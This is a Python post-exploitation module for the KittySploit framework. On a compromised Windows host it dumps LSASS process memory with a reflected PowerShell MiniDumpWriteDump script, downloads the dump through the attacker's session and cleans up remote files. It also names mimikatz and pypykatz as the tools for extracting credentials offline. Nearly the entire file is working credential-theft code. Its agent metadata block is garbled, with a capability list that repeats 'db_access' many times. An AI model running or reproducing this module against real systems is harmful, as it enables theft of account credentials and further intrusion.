#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Dump LSASS process memory via PowerShell MiniDumpWriteDump on a Windows shell or
Meterpreter session. The minidump is downloaded through the session and saved
under ./output.
"""

from kittysploit import *
import os
import re
import time

from lib.post.windows.session import KS_FILE_MARKER, WindowsSessionMixin

_LOCAL_OUT = "output"


class Module(Post, WindowsSessionMixin):
    _AUTO_CLEANUP = True

    __info__ = {
        "name": "Windows LSASS Memory Dump",
        "description": (
            "Dump the LSASS process to a minidump file using PowerShell's internal "
            "MiniDumpWriteDump wrapper on a Windows shell or Meterpreter session, "
            "then download the dump through the session."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1003/001/",
        ],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 6,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    out_dir = OptString("", "Remote directory for lsass dump (default: %TEMP%)", False)
    chunk_kb = OptInteger(512, "Chunk size in kilobytes for session reads", False)

    def _powershell_script(self) -> str:
        return rf"""
function MemoryDump {{
    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [System.Diagnostics.Process]$Process,

        [Parameter(Position = 1)]
        [string]$DumpFilePath
    )

    BEGIN {{
        $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
        $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
        $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
        $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
        $MiniDumpWithFullMemory = [UInt32] 2
    }}

    PROCESS {{
        $ProcessId = $Process.Id
        $ProcessName = $Process.Name
        $ProcessHandle = $Process.Handle
        $ProcessFileName = "$($ProcessName)_$($ProcessId).dmp"
        $ProcessDumpPath = Join-Path -Path $DumpFilePath -ChildPath $ProcessFileName

        $FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)
        $Result = $MiniDumpWriteDump.Invoke($null, @(
            $ProcessHandle,
            $ProcessId,
            $FileStream.SafeFileHandle,
            $MiniDumpWithFullMemory,
            [IntPtr]::Zero,
            [IntPtr]::Zero,
            [IntPtr]::Zero
        ))

        $FileStream.Close()

        if (-not $Result) {{
            $Exception = New-Object ComponentModel.Win32Exception
            Remove-Item -Path $ProcessDumpPath -ErrorAction SilentlyContinue
            throw $Exception.Message
        }}

        Get-Item -LiteralPath $ProcessDumpPath
    }}
}}

function Get-LSASSDump {{
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $True)]
        [string]$OutputDir
    )

    if (-not (Test-Path -LiteralPath $OutputDir)) {{
        New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
    }}

    $lsassProcess = Get-Process -Name lsass -ErrorAction Stop
    $dump = $lsassProcess | MemoryDump -DumpFilePath $OutputDir | Select-Object -First 1

    if (-not $dump) {{
        throw "LSASS minidump was not created"
    }}

    Write-Output "{KS_FILE_MARKER}$($dump.FullName)"
}}
"""

    def check(self):
        if not self.win_require_powershell():
            return False
        if not self.win_is_admin():
            print_error("Administrator or SYSTEM privileges are required to dump LSASS")
            whoami = self.win_execute("whoami", timeout=5, wrap_job=False)
            if whoami:
                print_warning(f"Current user: {whoami}")
            return False

        lsass_check = self.win_run_powershell(
            "if (Get-Process -Name lsass -ErrorAction SilentlyContinue) { '1' } else { '0' }",
            timeout=8,
        )
        if "1" not in lsass_check:
            print_error("LSASS process was not found on the target")
            return False

        print_success("Prerequisites confirmed (elevated session, LSASS running)")
        print_warning("This technique is likely to trigger AV/EDR detections")
        return True

    def run(self):
        if not self.check():
            raise ProcedureError(FailureType.NotAccess, "LSASS dump prerequisites not met")

        temp_dir = self.win_remote_temp_dir("out_dir")
        stamp = time.strftime("%Y%m%d_%H%M%S")
        local_dir = os.path.join(_LOCAL_OUT, f"lsass_dump_{stamp}")
        os.makedirs(local_dir, exist_ok=True)

        print_status("Uploading Get-LSASSDump payload...")
        script_path, blob_path = self.win_write_remote_script(
            self._powershell_script(),
            temp_dir,
            "dump_lsass",
        )

        invoke = (
            "$ErrorActionPreference='Stop';"
            f". '{self.win_ps_single_quote(script_path)}';"
            f"Get-LSASSDump -OutputDir '{self.win_ps_single_quote(temp_dir)}'"
        )

        print_status("Dumping LSASS memory (this may take a while)...")
        result = self.win_run_powershell(invoke, timeout=120)

        cleanup_paths = [script_path, blob_path]
        remote_path = self.win_parse_file_marker(result)

        if not remote_path:
            if self._AUTO_CLEANUP:
                self.win_delete_remote(cleanup_paths)
            if re.search(r"(Exception|failed|Access is denied|Cannot find|LSASS)", result, re.I):
                print_error(result or "Get-LSASSDump failed without output")
                raise ProcedureError(FailureType.Unknown, "LSASS dump failed")
            raise ProcedureError(FailureType.Unknown, "No dump file path was returned")

        base = os.path.basename(remote_path.replace("\\", "/")) or "lsass.dmp"
        local_path = os.path.join(local_dir, base)

        if not self.win_pull_file_via_session(
            remote_path,
            local_path,
            chunk_kb=self.win_int_opt(self.chunk_kb, 512),
        ):
            if self._AUTO_CLEANUP:
                self.win_delete_remote(cleanup_paths + [remote_path])
            raise ProcedureError(FailureType.Unknown, f"Failed to download {remote_path}")

        if self._AUTO_CLEANUP:
            self.win_delete_remote(cleanup_paths + [remote_path])

        rel = os.path.join(".", local_path)
        print_success(f"LSASS dump saved: {rel} ({os.path.getsize(local_path)} bytes)")
        print_info("Offline extraction: pypykatz lsa minidump <dump>  or  mimikatz sekurlsa::minidump")
        return True
